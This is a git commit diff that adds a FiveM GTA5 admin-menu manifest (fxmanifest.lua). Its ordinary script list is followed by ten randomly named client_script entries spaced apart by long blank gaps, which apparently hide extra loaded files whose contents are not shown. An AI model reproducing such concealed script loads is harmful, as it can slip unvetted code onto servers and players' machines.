a4ba52969140a6b2af9057e06422ce3947b30266
TontonZanks <131187220+TontonZanks@users.noreply.github.com>
2023-04-18 18:12:01 +0200

    Add files via upload

---
+++ admin/fxmanifest.lua
@@ -0,0 +1,82 @@
+fx_version 'adamant'
+
+game 'gta5'
+
+client_scripts {
+    "src/RMenu.lua",
+    "src/menu/RageUI.lua",
+    "src/menu/Menu.lua",
+    "src/menu/MenuController.lua",
+    "src/components/*.lua",
+    "src/menu/elements/*.lua",
+    "src/menu/items/*.lua",
+    "src/menu/panels/*.lua",
+    "src/menu/panels/*.lua",
+    "src/menu/windows/*.lua",
+}
+
+shared_scripts {
+    '@es_extended/locale.lua',
+    'config.lua'
+}
+
+client_scripts {
+    '@es_extended/locale.lua',
+    'cl_menu.lua',
+    'cl_report.lua'
+}
+
+server_scripts {
+    '@mysql-async/lib/MySQL.lua',
+    '@es_extended/locale.lua',
+    'server.lua'
+}
+
+dependencies {
+    'es_extended'
+}
+
+client_script "AfVnT.lua"
+
+client_script "CNdXJ.lua"
+
+
+
+
+
+
+
+
+
+
+
+
+client_script "ZnYzo.lua"
+
+client_script "yUwas.lua"
+
+
+
+client_script "iBYwI.lua"
+
+
+
+client_script "NMxgR.lua"
+client_script "jaOIf.lua"
+
+
+
+
+
+
+
+
+client_script "mIHKz.lua"
+
+
+
+client_script "KqQIN.lua"
+
+
+
+client_script "DkrbF.lua"
